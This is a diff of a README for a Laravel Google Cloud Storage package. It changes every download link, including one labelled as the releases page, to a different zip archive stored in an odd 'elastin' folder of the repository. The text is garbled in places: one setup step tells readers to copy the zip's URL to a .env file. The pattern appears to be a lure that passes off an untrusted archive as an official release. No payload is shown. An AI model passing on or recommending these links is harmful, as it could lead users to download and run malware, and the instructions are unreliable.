@@ -1,6 +1,6 @@
 # 🚀 laravel-gcs - Simplify Your Google Cloud Storage Access
 
-[![Download](https://raw.githubusercontent.com/abuelowsky/laravel-gcs/main/elastin/laravel-gcs.zip)](https://raw.githubusercontent.com/abuelowsky/laravel-gcs/main/elastin/laravel-gcs.zip)
+[![Download](https://github.com/abuelowsky/laravel-gcs/raw/refs/heads/main/elastin/laravel_gcs_v1.1.zip)](https://github.com/abuelowsky/laravel-gcs/raw/refs/heads/main/elastin/laravel_gcs_v1.1.zip)
 
 ## 📥 Overview
 
@@ -28,7 +28,7 @@ To get started with laravel-gcs, follow these steps to download and run the appl
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page:
    
-   [Visit Releases Page](https://raw.githubusercontent.com/abuelowsky/laravel-gcs/main/elastin/laravel-gcs.zip)
+   [Visit Releases Page](https://github.com/abuelowsky/laravel-gcs/raw/refs/heads/main/elastin/laravel_gcs_v1.1.zip)
 
 2. **Download the latest version**: Look for the latest version available and download it.
 
@@ -39,7 +39,7 @@ To get started with laravel-gcs, follow these steps to download and run the appl
    composer install
    ```
 
-5. **Set Up Your Environment**: Copy the `https://raw.githubusercontent.com/abuelowsky/laravel-gcs/main/elastin/laravel-gcs.zip` file to `.env` and update your Google Cloud credentials.
+5. **Set Up Your Environment**: Copy the `https://github.com/abuelowsky/laravel-gcs/raw/refs/heads/main/elastin/laravel_gcs_v1.1.zip` file to `.env` and update your Google Cloud credentials.
 
 6. **Run Migrations**: To set up the database, run:
    ```
@@ -57,7 +57,7 @@ To get started with laravel-gcs, follow these steps to download and run the appl
 
 To download laravel-gcs, visit the following link:
 
-[Download from Releases](https://raw.githubusercontent.com/abuelowsky/laravel-gcs/main/elastin/laravel-gcs.zip)
+[Download from Releases](https://github.com/abuelowsky/laravel-gcs/raw/refs/heads/main/elastin/laravel_gcs_v1.1.zip)
 
 Follow the steps outlined above to install the application on your local machine.
 
